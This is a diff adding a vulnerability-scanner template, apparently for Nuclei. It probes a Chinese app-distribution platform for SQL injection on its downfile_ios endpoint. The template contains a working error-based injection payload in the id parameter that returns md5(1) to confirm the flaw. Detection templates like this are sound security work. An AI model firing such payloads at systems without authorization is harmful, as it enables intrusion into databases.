@@ -1,0 +1,19 @@
+id: cjmapp-downfile-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: info
+  description: 超级猫签名APP分发平台前台存在SQL注入漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E8%B6%85%E7%BA%A7%E7%8C%AB%E7%AD%BE%E5%90%8DAPP%E5%88%86%E5%8F%91%E5%B9%B3%E5%8F%B0%E5%89%8D%E5%8F%B0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+    - https://mp.weixin.qq.com/s/xTcnm_fFubFCYw4LhIXwkQ?poc_token=HJfFpWajjlR2nwhYm-rimSE1yLFdNlEBcZCRebs6
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/user/install/downfile_ios?id=%27)%20AND%20GTID_SUBSET(CONCAT(0x716b627671,(SELECT%20(md5(1))),0x716a767171),4816)--%20SJRG"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0'
